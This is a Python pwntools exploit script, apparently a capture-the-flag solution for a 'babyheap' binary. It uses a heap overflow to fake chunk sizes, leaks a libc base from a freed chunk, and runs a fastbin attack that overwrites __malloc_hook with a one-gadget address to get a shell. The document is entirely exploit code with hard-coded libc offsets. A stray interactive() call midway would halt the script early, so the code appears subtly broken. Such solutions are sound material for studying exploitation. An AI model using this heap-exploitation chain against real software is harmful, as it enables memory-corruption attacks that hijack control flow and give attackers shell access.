# http://nextline.tistory.com/132
from pwn import *

s = process('./babyheap')

def alloc(size):
	s.recvuntil(': ')
	s.sendline('1')
	s.recvuntil(': ')
	s.sendline(size)

def fill(index,size,content):
	s.recvuntil(': ')
	s.sendline('2')
	s.recvuntil(': ')
	s.sendline(index)
	s.recvuntil(': ')
	s.sendline(size)
	s.recvuntil(': ')
	s.sendline(content)
	s.recvuntil(': ')

def free(index):
	s.recvuntil(': ')
	s.sendline('3')
	s.recvuntil(': ')
	s.sendline(index)

def dump(index):
	s.recvuntil(': ')
	s.sendline('4')
	s.recvuntil(': ')
	s.sendline(index)

alloc('72')
alloc('30')
alloc('150')
alloc('150')
s.interactive()

fill('0','80','A' * 72 + p64(0x51))
fill('1','80', p64(0)*9 + p64(0x51))

free('1')
alloc('72')

fill('0','128', p64(0)*9 + p64(0x51) + p64(0) * 5 + p64(0xa1))
free('2')

dump('1')
s.recvuntil("Content: \n")
libc_base = u64(s.recv(80)[48:56])-88-0x3c3b20
malloc_hook_around = libc_base + 0x3c3af5
oneshot = libc_base + 0x4526a
log.info("LIBC BASE : " + hex(libc_base))

alloc('72')
alloc('96')
alloc('96')
alloc('96')
alloc('96')

free('6')
free('5')
fill('4','120' , p64(0) * 13 + p64(0x71) + p64(malloc_hook_around-0x8))

alloc('96')
alloc('96')
fill('6','27',p64(0) * 2 + "\x00" * 3 + p64(oneshot))

alloc('1')
s.success("GOT SHELL!")
s.interactive()
